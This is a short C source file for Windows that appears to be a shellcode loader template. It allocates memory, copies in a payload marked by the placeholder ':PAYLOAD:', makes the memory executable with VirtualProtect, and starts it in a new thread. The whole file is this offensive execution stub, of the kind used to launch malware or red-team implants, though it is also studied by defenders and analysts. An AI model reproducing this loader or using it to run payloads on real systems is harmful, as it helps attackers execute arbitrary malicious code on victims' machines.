#include <windows.h>

void main() {
  void* exec;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  // Shellcode
  unsigned char payload[] = ":PAYLOAD:";
  unsigned int payload_len = 205;
  exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  RtlMoveMemory(exec, payload, payload_len);
  rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
  WaitForSingleObject(th, -1);

}